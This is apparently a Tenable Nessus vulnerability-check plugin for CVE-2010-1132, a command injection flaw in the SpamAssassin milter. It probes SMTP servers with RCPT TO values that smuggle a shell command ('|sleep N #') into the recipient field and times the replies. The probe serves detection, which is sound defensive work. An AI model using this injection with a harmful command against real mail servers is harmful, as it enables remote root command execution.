#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(45019);
 script_version ("$Revision: 1.11 $");

 script_cve_id("CVE-2010-1132");
 script_bugtraq_id(38578);
 script_osvdb_id(62809);
 script_xref(name:"Secunia", value:"38840");

 script_name(english: "SpamAssassin Milter Plugin 'mlfi_envrcpt()' Remote Arbitrary Command Injection");
 script_summary(english: "Redirection check");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary commands can be executed on the remote SMTP server." );
 script_set_attribute(attribute:"description", value:
"The remote mail server is affected by a command execution
vulnerability. 

Specifically, the 'spamass-milter' plugin does not properly sanitize
user-supplied input and can be tricked into executing arbitrary
commands on the remote server (by default with root privileges)." );
 script_set_attribute(attribute:"see_also", value:
"http://seclists.org/fulldisclosure/2010/Mar/140");
 script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2010/03/09");
 script_set_attribute(attribute:"vuln_publication_date", value: "2010/03/08");
 script_cvs_date("$Date: 2016/11/17 15:15:44 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe",value:"cpe:/a:georg_greve:spamassassin_milter_plugin");
 script_end_attributes();
 
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");
 script_family(english: "SMTP problems");
 script_dependencie("smtpserver_detect.nasl");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("misc_func.inc");
include("smtp_func.inc");

port = get_service(svc:"smtp", default:25, exit_on_fail:TRUE);
if (!get_port_state(port)) exit(0, "Port "+port+" is not open.");

if (get_kb_item("SMTP/"+port+"/qmail")) exit(0);	# FP

soc = open_sock_tcp(port);
if (! soc) exit(1, "Can't open socket on port "+port+".");

  b = smtp_recv_banner(socket:soc);
  domain = ereg_replace(pattern:"[^\.]*\.(.*)", string:get_host_name(), replace:"\1");		
  s = string("HELO ", domain, "\r\n");
  send(socket:soc, data:s);
  r = recv_line(socket:soc, length:1024);
  if ( r !~ "^250" ) exit(1, "The SMTP server on port "+port+" replied with an error code to our 'HELO' request.");
  s = string("MAIL FROM: <root@[", this_host(), "]>\r\n"); 
  send(socket:soc, data:s);
  r = recv_line(socket:soc, length:1024);
  if ( r !~ "^250" ) exit(1, "The SMTP server on port "+port+" replied with an error code to our 'MAIL FROM' request.");
  to = make_list(5, 10, 20);
  foreach i (to) 
  {
   s = string('RCPT TO: root+:"|sleep ', i, ' #"\r\n');
   send(socket:soc, data:s);
   then = unixtime();
   r = recv_line(socket:soc, length:255, timeout:i*2);
   if ( ! r || r !~ "^250" ) exit(0, "Host is not vulnerable.");
   now = unixtime();
   if ( now - then < i || now - then > (i+5) ) exit(0, "Host is not vulnerable.");
  }
  close(soc);
  security_hole(port);
